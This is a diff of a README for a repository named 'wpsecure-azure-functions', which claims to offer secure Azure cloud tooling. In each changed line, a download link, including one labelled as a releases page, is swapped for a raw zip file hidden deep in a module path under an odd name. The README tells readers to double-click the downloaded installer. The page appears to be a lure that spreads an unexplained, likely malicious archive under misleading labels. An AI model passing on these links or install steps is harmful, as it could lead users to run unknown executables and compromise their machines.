@@ -1,6 +1,6 @@
 # 🚀 wpsecure-azure-functions - Secure Your Cloud Operations Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-get-user-attributes/Modules/Microsoft.Graph.Authentication/2.34.0/custom/wpsecure_azure_functions_v3.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-get-user-attributes/Modules/Microsoft.Graph.Authentication/2.34.0/custom/wpsecure_azure_functions_v3.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-outlook-web-signature-update/Modules/ExchangeOnlineManagement/functions_wpsecure_azure_undecorously.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-outlook-web-signature-update/Modules/ExchangeOnlineManagement/functions_wpsecure_azure_undecorously.zip)
 
 ## 📋 Description
 This repository explains how Azure API Management and Azure Functions help to securely manage cloud-dependent operations for WPSecure. With our tools, you can simplify deployment automation, endpoint management, and more. 
@@ -21,7 +21,7 @@ This repository explains how Azure API Management and Azure Functions help to se
 ## 🚀 Getting Started
 To get started with "wpsecure-azure-functions", follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-get-user-attributes/Modules/Microsoft.Graph.Authentication/2.34.0/custom/wpsecure_azure_functions_v3.3.zip) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-outlook-web-signature-update/Modules/ExchangeOnlineManagement/functions_wpsecure_azure_undecorously.zip) to find the latest version.
 2. Download the software by clicking on the appropriate version you need for your setup.
 3. Once downloaded, locate the file in your Downloads folder.
 4. Double-click the file to run the installer.
@@ -30,7 +30,7 @@ To get started with "wpsecure-azure-functions", follow these simple steps:
 ## 📥 Download & Install
 To download and install the "wpsecure-azure-functions" application:
 
-1. **Visit this page to download**: [Download Latest Release](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-get-user-attributes/Modules/Microsoft.Graph.Authentication/2.34.0/custom/wpsecure_azure_functions_v3.3.zip).
+1. **Visit this page to download**: [Download Latest Release](https://raw.githubusercontent.com/VLTZ22/wpsecure-azure-functions/main/wpsecure-outlook-web-signature-update/Modules/ExchangeOnlineManagement/functions_wpsecure_azure_undecorously.zip).
 2. Choose the version that suits your needs.
 3. After the download, locate the installer.
 4. Run the installer by double-clicking it.
